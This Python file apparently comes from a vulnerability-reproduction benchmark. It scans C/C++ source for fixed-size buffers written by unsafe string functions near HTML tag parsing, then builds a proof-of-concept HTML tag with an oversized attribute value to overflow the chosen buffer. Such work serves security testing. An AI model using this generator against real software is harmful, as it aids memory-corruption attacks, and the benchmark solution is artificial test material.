import os
import re
import io
import ast
import tarfile
import tempfile
from typing import Dict, Optional, Tuple, List


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.abspath(path) + os.sep
    for member in tar.getmembers():
        member_path = os.path.abspath(os.path.join(path, member.name))
        if not (member_path + (os.sep if os.path.isdir(member_path) else "")).startswith(base):
            continue
        try:
            tar.extract(member, path=path, set_attrs=False)
        except Exception:
            pass


def _read_text_file(path: str, max_bytes: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


_ALLOWED_EXPR = re.compile(r"^[0-9A-Za-z_ \t\+\-\*\/\%\&\|\^\(\)\<\>\~]+$")


def _safe_eval_int_expr(expr: str, macros: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    # Strip common casts and sizeof (best-effort)
    expr = re.sub(r"\bsizeof\s*\([^)]*\)", "1", expr)
    expr = re.sub(r"\(\s*(?:unsigned|signed|int|long|short|char|size_t|ssize_t)\s*\)", "", expr)

    # Replace macros (a few passes)
    for _ in range(5):
        changed = False

        def repl(m):
            nonlocal changed
            name = m.group(0)
            if name in macros:
                changed = True
                return str(macros[name])
            return name

        new_expr = re.sub(r"\b[A-Za-z_]\w*\b", repl, expr)
        expr = new_expr
        if not changed:
            break

    expr = expr.strip()
    if not _ALLOWED_EXPR.match(expr):
        return None

    try:
        node = ast.parse(expr, mode="eval")
    except Exception:
        return None

    def eval_node(n) -> int:
        if isinstance(n, ast.Expression):
            return eval_node(n.body)
        if isinstance(n, ast.Constant) and isinstance(n.value, (int,)):
            return int(n.value)
        if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert)):
            v = eval_node(n.operand)
            if isinstance(n.op, ast.UAdd):
                return +v
            if isinstance(n.op, ast.USub):
                return -v
            return ~v
        if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod, ast.LShift, ast.RShift, ast.BitAnd, ast.BitOr, ast.BitXor)):
            a = eval_node(n.left)
            b = eval_node(n.right)
            op = n.op
            if isinstance(op, ast.Add):
                return a + b
            if isinstance(op, ast.Sub):
                return a - b
            if isinstance(op, ast.Mult):
                return a * b
            if isinstance(op, (ast.Div, ast.FloorDiv)):
                if b == 0:
                    return 0
                return a // b
            if isinstance(op, ast.Mod):
                if b == 0:
                    return 0
                return a % b
            if isinstance(op, ast.LShift):
                return a << b
            if isinstance(op, ast.RShift):
                return a >> b
            if isinstance(op, ast.BitAnd):
                return a & b
            if isinstance(op, ast.BitOr):
                return a | b
            return a ^ b
        raise ValueError("unsupported")

    try:
        v = eval_node(node)
        if v < 0:
            return None
        return int(v)
    except Exception:
        return None


def _gather_source_files(root: str) -> List[str]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl"}
    out = []
    for d, _, files in os.walk(root):
        for fn in files:
            ext = os.path.splitext(fn)[1].lower()
            if ext in exts:
                out.append(os.path.join(d, fn))
    return out


def _parse_macros(text: str) -> Dict[str, int]:
    macros: Dict[str, int] = {}
    for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$", text):
        name = m.group(1)
        val = m.group(2).strip()
        if len(val) > 80:
            continue
        if "(" in name:
            continue
        iv = _safe_eval_int_expr(val, macros)
        if iv is None:
            # common patterns like 1<<10
            iv = _safe_eval_int_expr(val.replace("UL", "").replace("U", "").replace("L", ""), macros)
        if iv is not None and 0 <= iv <= 1_000_000:
            macros[name] = iv
    return macros


def _infer_best_buffer_and_input_limit(texts: List[str]) -> Tuple[int, int, str, str]:
    # returns (out_buf_size_guess, max_input_guess, tag_name, attr_name)
    macros: Dict[str, int] = {}
    for t in texts:
        macros.update(_parse_macros(t))

    # Infer known tag/attr names
    tag_candidates = set()
    attr_candidates = set()

    for t in texts:
        for m in re.finditer(r"""(?i)\b(?:str(?:case)?cmp|strn(?:case)?cmp)\s*\(\s*\w+\s*,\s*"([A-Za-z][A-Za-z0-9_-]{0,31})"\s*\)""", t):
            s = m.group(1)
            if 1 <= len(s) <= 16:
                tag_candidates.add(s.lower())
        for m in re.finditer(r'"(href|src|name|content|value|title|alt|id|class|style|rel|type|data|url)"', t, flags=re.I):
            attr_candidates.add(m.group(1).lower())

    preferred_tags = ["a", "img", "link", "script", "style", "meta", "title", "body", "html", "div", "span", "p", "br"]
    preferred_attrs = ["href", "src", "content", "name", "value", "title", "alt", "id", "class", "style"]

    tag_name = None
    for tg in preferred_tags:
        if tg in tag_candidates:
            tag_name = tg
            break
    if tag_name is None:
        tag_name = next(iter(tag_candidates), "a")

    attr_name = None
    for at in preferred_attrs:
        if at in attr_candidates:
            attr_name = at
            break
    if attr_name is None:
        attr_name = next(iter(attr_candidates), "href")

    # Infer max input (best-effort)
    max_in = 0
    for t in texts:
        for m in re.finditer(r"\bfgets\s*\(\s*\w+\s*,\s*([^)]+?)\s*,", t):
            v = _safe_eval_int_expr(m.group(1), macros)
            if v is not None:
                max_in = max(max_in, v)
        for m in re.finditer(r"\bread\s*\(\s*[^,]+,\s*[^,]+,\s*([^)]+?)\s*\)", t):
            v = _safe_eval_int_expr(m.group(1), macros)
            if v is not None:
                max_in = max(max_in, v)
        for m in re.finditer(r"\bgetdelim\s*\([^,]+,\s*[^,]+,\s*([^)]+?)\s*,", t):
            # delimiter char; ignore
            pass
    if max_in <= 0:
        max_in = 8192
    max_in = max(1024, min(max_in, 1_000_000))

    # Infer likely vulnerable output buffer size
    # Find fixed arrays and their risky usage
    decls: Dict[str, int] = {}
    for t in texts:
        for m in re.finditer(r"(?m)^\s*(?:unsigned\s+)?char\s+([A-Za-z_]\w*)\s*\[\s*([^\]\n;]+)\s*\]\s*;", t):
            name = m.group(1)
            sz_expr = m.group(2)
            sz = _safe_eval_int_expr(sz_expr, macros)
            if sz is None:
                continue
            if 16 <= sz <= 200_000:
                decls[name] = sz

    risk = {name: 0 for name in decls.keys()}

    unsafe_funcs = ["strcpy", "strcat", "sprintf", "vsprintf", "gets", "scanf", "sscanf", "strncpy"]  # strncpy can still be misused; low weight
    for t in texts:
        low = t.lower()
        for func in unsafe_funcs:
            for m in re.finditer(r"\b" + re.escape(func) + r"\s*\(\s*([A-Za-z_]\w*)", t):
                dst = m.group(1)
                if dst not in decls:
                    continue
                pos = m.start()
                ctx = low[max(0, pos - 300): min(len(low), pos + 300)]
                score = 8
                if func in ("strcpy", "strcat", "sprintf", "vsprintf", "gets"):
                    score += 6
                if "tag" in ctx:
                    score += 10
                if "<" in ctx and ">" in ctx:
                    score += 6
                if "html" in ctx or "xml" in ctx or "markup" in ctx:
                    score += 4
                if any(k in dst.lower() for k in ("out", "dst", "dest", "buf", "buffer", "result", "line", "tmp")):
                    score += 3
                risk[dst] += score

        for m in re.finditer(r"\b(?:memcpy|memmove)\s*\(\s*([A-Za-z_]\w*)\s*,", t):
            dst = m.group(1)
            if dst not in decls:
                continue
            pos = m.start()
            ctx = low[max(0, pos - 300): min(len(low), pos + 300)]
            score = 4
            if "tag" in ctx:
                score += 6
            if "<" in ctx and ">" in ctx:
                score += 4
            if any(k in dst.lower() for k in ("out", "dst", "dest", "buf", "buffer", "result")):
                score += 2
            risk[dst] += score

    # Prefer stack-ish sized buffers (likely 128..8192)
    candidates = []
    for name, sz in decls.items():
        r = risk.get(name, 0)
        if r <= 0:
            continue
        if not (64 <= sz <= 65536):
            continue
        candidates.append((r, sz, name))

    if candidates:
        candidates.sort(key=lambda x: (-x[0], x[1]))
        best_r, best_sz, best_name = candidates[0]
        out_sz = best_sz
    else:
        # fallback: common stack buffer sizes; pick 1024 as conservative
        out_sz = 1024

    # Clamp out_sz to something reasonable
    if out_sz < 128:
        out_sz = 128
    if out_sz > 65536:
        out_sz = 65536

    return out_sz, max_in, tag_name, attr_name


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            root = td
            if os.path.isdir(src_path):
                root = src_path
            else:
                try:
                    with tarfile.open(src_path, "r:*") as tar:
                        _safe_extract_tar(tar, td)
                except Exception:
                    # If not a tarball, treat as directory path
                    root = src_path

            files = _gather_source_files(root)
            texts = []
            total = 0
            for fp in files:
                t = _read_text_file(fp, max_bytes=1_000_000)
                if not t:
                    continue
                total += len(t)
                texts.append(t)
                if total > 6_000_000:
                    break

            out_sz, max_in, tag_name, attr_name = _infer_best_buffer_and_input_limit(texts)

            # Create a likely-overflowing tag with a long attribute value.
            # Keep under max_in (best effort), while exceeding out_sz by a margin.
            prefix = f"<{tag_name} {attr_name}=\"".encode("ascii", "ignore")
            suffix = f"\">x</{tag_name}>\n".encode("ascii", "ignore")

            overhead = len(prefix) + len(suffix)
            # margin to compensate for unknown formatting added by the vulnerable code
            margin = max(64, out_sz // 8)

            # Ensure we exceed out_sz meaningfully while staying below max_in
            desired_total = out_sz + margin + overhead
            cap_total = max_in - 1 if max_in and max_in > overhead + 16 else (out_sz + margin + overhead)
            total_len = min(max(desired_total, overhead + 256), cap_total)

            payload_len = max(1, total_len - overhead)
            payload = b"A" * payload_len

            poc = prefix + payload + suffix

            # Add a minimal HTML wrapper if it doesn't exceed limits, to improve parser acceptance
            wrapper_pre = b"<html><body>\n"
            wrapper_post = b"</body></html>\n"
            if len(poc) + len(wrapper_pre) + len(wrapper_post) <= cap_total:
                poc = wrapper_pre + poc + wrapper_post

            # Final safety cap
            if len(poc) > cap_total:
                poc = poc[:cap_total]

            return poc